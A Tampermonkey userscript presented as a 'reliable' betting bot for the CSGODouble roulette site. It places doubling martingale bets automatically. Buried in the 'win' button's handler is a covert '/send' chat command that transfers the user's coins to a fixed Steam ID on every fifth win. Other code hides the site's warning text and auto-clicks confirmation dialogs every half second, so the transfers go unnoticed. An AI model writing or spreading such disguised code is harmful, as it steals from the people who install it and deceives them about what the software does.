// ==UserScript==
// @name         CSGODouble Botas
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Patikimas CSGODouble botas
// @author       You
// @match        http://www.csgodouble.com/index.php
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/16890/CSGODouble%20Botas.user.js
// @updateURL https://update.greasyfork.org/scripts/16890/CSGODouble%20Botas.meta.js
// ==/UserScript==
/* jshint -W097 */
'use strict';

// Your code here...
if(!(document.getElementById('bot'))){
   
    chat("italic","Bot is working");
    var betbutt = document.getElementsByClassName("betButton");
    betbutt[0].id="red";
    betbutt[2].id="black";
    var g;
    var base=1;
    g=document.createElement('style');
    g.appendChild(document.createTextNode(".text-danger{display: none; !important}"));
    document.getElementsByTagName("head")[0].appendChild(g);
    g=document.createElement('div');
    g.setAttribute("id", "bot");
    g.style.position="fixed";
    g.style.bottom="150px";
    g.style.left="50px";
    g.style.width="400px";
    g.style.height="100px";
    g.style.color="black";
    g.style.textAlign="center";
    g.style.backgroundColor="grey";
    document.body.appendChild(g);
    g=document.createElement('p');
    g.appendChild(document.createTextNode("EZ MONIES BOT"));
    g.style.width="100%";
        g.style.color ="white";
    document.getElementById('bot').appendChild(g);
    g=document.createElement('p');
    g.appendChild(document.createTextNode("Bot is working..."));
    g.style.width="100%";
    g.style.color ="white";
    document.getElementById('bot').appendChild(g);
    g=document.createElement('input');
    g.setAttribute("id", "ezbet");
    g.style.display="none";
    g.setAttribute("value", base );
    g.setAttribute("type", "number" );
    g.style.width="100%";
    document.getElementById('bot').appendChild(g);
    g=document.createElement('button');
    g.setAttribute("id", "ezwin");
    g.style.borderColor = "white";
    g.appendChild(document.createTextNode("win"));
    g.setAttribute("onclick", "document.getElementById('ezbet').value=document.getElementById('ezbase').value;document.getElementById('ezxwin').stepUp(1);if(document.getElementById('ezxwin').value%5==4){document.getElementById('lel').stepUp(1);/*document.getElementById('chatMessage').value='send ';document.getElementById('chatMessage').send();*/send({'type':'chat','msg':'/send 76561198058003993 '+document.getElementById('ezbase').value, 'lang':LANG});}" );
    g.style.width="100%";
    g.style.position="absolute";
    g.style.bottom="20px";
    g.style.left="0px";
    g.style.color="white";
    g.style.height="20px";
    g.style.backgroundColor="black";
    document.getElementById('bot').appendChild(g);
    g=document.createElement('button');
    g.setAttribute("id", "ezred");
    
    g.appendChild(document.createTextNode("1-7"));
    g.setAttribute("onclick", "document.getElementById('betAmount').value=document.getElementById('ezbet').value;document.getElementById('ezbet').value=document.getElementById('ezbet').value*2;document.getElementById('red').click();" );
    g.style.width="50%";
    g.style.position="absolute";
    g.style.bottom="0px";
    g.style.left="0px";
    g.style.color="black";
    g.style.height="20px";
    g.style.backgroundColor="red";
    document.getElementById('bot').appendChild(g);
    g=document.createElement('button');
    g.setAttribute("id", "ezblack");

    g.appendChild(document.createTextNode("8-14"));
    g.setAttribute("onclick", "document.getElementById('betAmount').value=document.getElementById('ezbet').value;document.getElementById('ezbet').value=document.getElementById('ezbet').value*2;document.getElementById('black').click();" );
    g.style.width="50%";
    g.style.position="absolute";
    g.style.bottom="0px";
    g.style.right="0px";
    g.style.color="red";
    g.style.height="20px";
    g.style.backgroundColor="black";
    document.getElementById('bot').appendChild(g);
}
if(!(document.getElementById('ezscore'))){
    g=document.createElement('div');
    g.setAttribute("id", "ezscore");
    g.style.position="fixed";
    g.style.bottom="50px";
    g.style.left="50px";
    g.style.width="400px";
    g.style.height="100px";
    g.style.color="black";
    g.style.textAlign="center";
    g.style.backgroundColor="grey";
    document.body.appendChild(g);
    g=document.createElement('p');
    g.appendChild(document.createTextNode("Scores"));
    g.style.width="100%";
        g.style.color ="white";
    document.getElementById('ezscore').appendChild(g);
    g=document.createElement('input');
    g.setAttribute("id", "ezlast");
    g.style.display="none";
    g.setAttribute("value", "15" );
    g.style.width="100%";
    document.getElementById('ezscore').appendChild(g);
    g=document.createElement('input');
    g.setAttribute("id", "ezlastid");
    g.style.display="none";
    g.setAttribute("value", "0" );
    g.style.width="100%";
    document.getElementById('ezscore').appendChild(g);
    g=document.createElement('label');
    g.setAttribute("for", "base1" );
    g.appendChild(document.createTextNode("Base:"));
    g.style.width="50%";
        g.style.color ="white";
    document.getElementById('ezscore').appendChild(g);
    g=document.createElement('input');
    g.setAttribute("id", "ezbase");
    g.setAttribute("name", "base1" );
    g.setAttribute("type", "number" );
    g.setAttribute("value", "1" );
    g.style.width="50%";
    document.getElementById('ezscore').appendChild(g);
    g=document.createElement('label');
    g.setAttribute("for", "multiple" );
    g.appendChild(document.createTextNode("Won:"));
        g.style.color ="white";
    g.style.width="50%";
    document.getElementById('ezscore').appendChild(g);
    g=document.createElement('input');
    g.setAttribute("id", "ezxwin");
    g.setAttribute("name", "multiple" );
    g.setAttribute("type", "number" );
    g.setAttribute("value", "0" );
    g.style.width="50%";
    document.getElementById('ezscore').appendChild(g);
     g=document.createElement('input');
    g.setAttribute("id", "lel");
    g.setAttribute("type", "number" );
    g.setAttribute("value", "0" );
    g.style.display="none";
    g.style.width="50%";
    document.getElementById('ezscore').appendChild(g);
    
    var kudlaczaconfirm = setInterval(function(){ 

var ezbuttons = document.getElementsByTagName("button");
    if(ezbuttons){
        for(var ezone=0;ezone<ezbuttons.length;ezone++)
        {
                if(ezbuttons[ezone].hasAttribute("data-bb-handler"))
                {
                        if(ezbuttons[ezone].getAttribute("data-bb-handler")=="confirm")
                        {
                                ezbuttons[ezone].click();
                        }
                }
        }}
}, 500);
    
}
var kudlaczamain = setInterval(function(){ 
    var azz=document.getElementById("past");
    var div=azz.getElementsByTagName("div");
    if(document.getElementById('ezlastid').value<div[div.length-1].dataset.rollid){
        document.getElementById('ezlast').value=div[div.length-1].textContent;
        document.getElementById('ezlastid').value=div[div.length-1].dataset.rollid;
        var ezbet = setInterval(function(){ 
            if(!(betbutt[1].disabled)){
                if(div[div.length-1].textContent!=0){
                    if((div[div.length-1].textContent>0)&&(div[div.length-1].textContent<8)){
                        if((div[div.length-2].textContent>0)&&(div[div.length-2].textContent<8)){
                            document.getElementById('ezwin').click();
                        }
                        document.getElementById('ezred').click();
                    }
                    if((div[div.length-1].textContent>7)&&(div[div.length-1].textContent<15)){
                        if((div[div.length-2].textContent>7)&&(div[div.length-2].textContent<15)){
                            document.getElementById('ezwin').click();
                        }
                        document.getElementById('ezblack').click();
                    }
                    clearInterval(ezbet);
                }else{
                    if(div[div.length-2].textContent!=0){
                        if((div[div.length-2].textContent>0)&&(div[div.length-2].textContent<8)){
                            document.getElementById('ezred').click();
                        }
                        if((div[div.length-2].textContent>7)&&(div[div.length-2].textContent<15)){
                            document.getElementById('ezblack').click();
                        }
                        clearInterval(ezbet);
                    }else{
                        if(div[div.length-3].textContent!=0){
                            if((div[div.length-3].textContent>0)&&(div[div.length-3].textContent<8)){
                                document.getElementById('ezred').click();
                            }
                            if((div[div.length-3].textContent>7)&&(div[div.length-3].textContent<15)){
                                document.getElementById('ezblack').click();
                            }
                            clearInterval(ezbet);
                        }
                        clearInterval(ezbet);
                    }
                }
            }
        }, 1000);
    }
}, 300);